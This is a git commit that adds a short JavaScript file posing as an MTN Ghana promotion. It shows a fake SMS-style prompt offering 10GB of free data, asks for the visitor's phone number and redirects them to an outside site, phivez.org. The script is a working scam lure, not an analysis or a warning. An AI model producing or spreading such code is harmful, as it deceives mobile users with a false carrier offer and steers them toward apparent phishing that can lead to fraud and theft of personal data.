fbb6e0a3b7e4c08fdf28aa19d9008a204f21ec76
newblog13 <sweet16guyz@gmail.com>
2026-02-04 11:44:44 +0100

    Create mtn-ghana-active.js

---
+++ mtn-ghana-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, your MTN Number is eligible to receive 10GB Free Data From MTN Ghana, click OK to Enter Your MTN Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://phivez.org/mtn-ghana.html';
+}
